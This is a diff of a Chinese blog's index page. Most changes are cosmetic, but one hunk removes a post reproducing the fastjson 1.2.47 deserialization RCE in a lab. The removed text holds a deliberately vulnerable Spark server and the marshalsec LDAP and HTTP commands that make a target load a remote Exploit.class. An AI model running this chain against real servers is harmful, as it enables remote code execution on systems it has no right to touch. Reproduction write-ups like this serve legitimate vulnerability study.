@@ -24,10 +24,6 @@
 
 
 
-
-
-
-
   <meta name="google-site-verification" content="NPoYFKPdDHhzWooq26nsz6osxjL5zH-1Sn3AmNnb5Sc"/>
 
 
@@ -38,17 +34,6 @@
 
 
 
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.2.0"/>
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/pic/favicon.ico?v=7.2.0">
@@ -67,6 +52,21 @@
 
 
 
+<link rel="stylesheet" href="/css/main.css?v=7.2.0"/>
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0"/>
+
+
+
+
+
+
+
 
 <script id="hexo.configurations">
   var NexT = window.NexT || {};
@@ -78,8 +78,9 @@
     back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
     copycode: {"enable":false,"show_result":false},
     fancybox: false,
-    fastclick: false,
+    mediumzoom: false,
     lazyload: false,
+    pangu: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -458,7 +459,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -525,47 +526,17 @@
 
       
         
+          <p>这两天爆出了 fastjson 的老洞，复现简单记录一下。</p>
+<p>首先使用 spark 搭建一个简易的利用 fastjson 解析 json 的 http server。</p>
+          <!--noindex-->
           
-            <p>首先使用 spark 搭建一个简易的利用 fastjson 解析 json 的 http server。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.hacktech.fastjsonserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        get(<span class="string">"/hello"</span>, (req, res) -&gt; <span class="string">"spark server start success"</span>);</span><br><span class="line">        post(<span class="string">"/test"</span>, (req, res) -&gt; &#123;</span><br><span class="line">            String payload = req.body();</span><br><span class="line">            JSON.parse(payload);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"json payload："</span> + payload;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译出来后，启动这个 jar，在 <code>/test</code> 这个 post 点即可 post json payload。</p>
-<p>然后这里分两类：</p>
-<ol>
-<li>如果只是想检测漏洞是否存在，可以使用 dnslog 去检测</li>
-<li>利用的话，需要自己起一个恶意的 ldap 或者 rmi 服务</li>
-</ol>
-<p>本机需要起一个 LDAP 服务和 http 服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc--&gt;LDAP--&gt;http</span><br></pre></td></tr></table></figure>
-<p>poc 会通过上面的路径去请求你的 http 服务上面的对应的 class 文件然后去解析执行这个 class</p>
-<p>启动 LDAP 用的 marshalsec，会比较方便。</p>
-<ol>
-<li>在本目录下启动 http server 在 80 端口</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>启动 LDAP 服务</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit</span><br></pre></td></tr></table></figure>
-<p>后面的 Exploit 是指 Exploit.class 文件</p>
-<ol start="3">
-<li>运行 PoC，它会请求 LDAP 服务，或者直接把 json payload post 到 <code>/test</code></li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson-1.2.47.jar; PoC</span><br></pre></td></tr></table></figure>
-<p>其中代码编译的话，直接执行 <code>javac the.java</code> 即可，不过 PoC.java 的编译需要引入 fastjson jar 包，运行 <code>javac -cp ./fastjson-1.2.47.jar PoC.java</code></p>
-<p>具体的细节可见<a href="https://www.lanzous.com/i4zzqej" target="_blank" rel="noopener">代码打包文件</a></p>
-<h2 id="复现遇到一些坑"><a href="#复现遇到一些坑" class="headerlink" title="复现遇到一些坑"></a>复现遇到一些坑</h2><p>这次的这个洞是有 jdk 版本要求的。</p>
-<p>最开始我在我本机测试通过，原因是因为它请求不到 class 的时候会去本目录下进行一个查找，也就是并没有经过 http 服务器。</p>
-<p>所以想要复现这个漏洞的话，需要 target 主机上面的 jdk 版本有严格的要求，具体见下图</p>
-<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190716164141951_25963.png" alt=""></p>
-<p>所以建议复现流程是</p>
-<h2 id="建议复现流程"><a href="#建议复现流程" class="headerlink" title="建议复现流程"></a>建议复现流程</h2><ol>
-<li>起一个虚拟机专门用来运行我写的那个简易的 fastjsonserver，或者你可以直接在虚拟机上面执行 PoC，关键在于 target 机器的 jdk 版本。</li>
-<li>你可以在本机起 ldap/rmi 服务以及 http 服务，或者全部在虚拟机上运行也可以，但是一般真实情况下我们是在外部构造恶意的 ldap/rmi 以及 http server，所以建议这步放到虚拟机外运行。</li>
-<li>根据你的网络环境修改 PoC。</li>
-<li>然后 post payload 或者运行 PoC，即可看到虚拟机上弹出了计算器。</li>
-</ol>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/15/fastjson-under-1.2.47-rce.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
     </div>
@@ -682,7 +653,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -876,7 +847,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -1069,7 +1040,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -1262,7 +1233,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -1459,7 +1430,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -1652,7 +1623,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -1846,7 +1817,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -2039,7 +2010,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -2233,7 +2204,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-07-16 16:48:12" itemprop="dateModified" datetime="2019-07-16T16:48:12+08:00">2019-07-16</time>
+                <time title="修改时间：2019-07-23 22:05:17" itemprop="dateModified" datetime="2019-07-23T22:05:17+08:00">2019-07-23</time>
               </span>
             
           
@@ -2809,6 +2780,9 @@
     
 
     
+
+    
+
   </div>
 
   
@@ -2828,12 +2802,14 @@
 
 
 
+
+
+
+
+
+
   
   
-
-
-
-
 
 
 
@@ -2880,9 +2856,16 @@
 
   
 
-  
 
   
+
+
+
+
+
+
+
+
   
 <script>
   function loadCount() {
@@ -2901,7 +2884,12 @@
 
 
 
-  
+
+
+
+
+
+
   <script>
     // Popup Window;
     var isfetched = false;
@@ -3226,17 +3214,30 @@
 
 
 
-  
 
-  
 
-  
 
-  
 
-  
 
-  
+
+
+
+
+<script>
+// GET RESPONSIVE HEIGHT PASSED FROM IFRAME
+
+window.addEventListener("message", function(e) {
+  var data = e.data;
+  if ((typeof data === 'string') && (data.indexOf('ciu_embed') > -1)) {
+    var featureID = data.split(':')[1];
+    var height = data.split(':')[2];
+    $(`iframe[data-feature=${featureID}]`).height(parseInt(height) + 30);
+  }
+}, false);
+</script>
+
+
+
   <script>
     (function(){
       var bp = document.createElement('script');
@@ -3248,19 +3249,8 @@
   </script>
 
 
-  
 
-  
 
-  
-
-  
-
-  
-
-  
-
-  
 
 
   
